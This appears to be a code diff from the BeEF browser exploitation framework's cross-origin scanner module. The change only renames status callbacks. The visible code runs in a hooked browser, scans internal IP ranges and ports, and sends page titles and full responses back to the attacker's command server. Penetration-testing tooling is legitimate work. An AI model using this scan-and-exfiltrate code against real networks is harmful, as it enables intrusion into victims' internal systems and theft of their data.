@@ -14,7 +14,7 @@ beef.execute(function() {
   var wait    = parseInt("<%= @wait %>", 10)*1000;
 
   if(!beef.browser.hasCors()) {
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.status.error());
     return;
   }
 
@@ -48,7 +48,7 @@ beef.execute(function() {
     // set target IP range
     var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
     if (range == null || range[1] == null) {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.status.error());
       return;
     }
     // ipRange will be in the form of 192.168.0.1-192.168.0.254
@@ -111,7 +111,7 @@ beef.execute(function() {
        'if (response != null && response["status"] != 0) {' +
         'beef.debug("[Cross-Origin Scanner (CORS)] Received response from '+url+': " + JSON.stringify(response));' +
         'var title = response["body"].match("<title>(.*?)<\\/title>"); if (title != null) title = title[1];' +
-        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto='+proto+'&ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response), beef.are.status_success());' +
+        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto='+proto+'&ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response), beef.status.success());' +
        '}' +
       '});'
       );
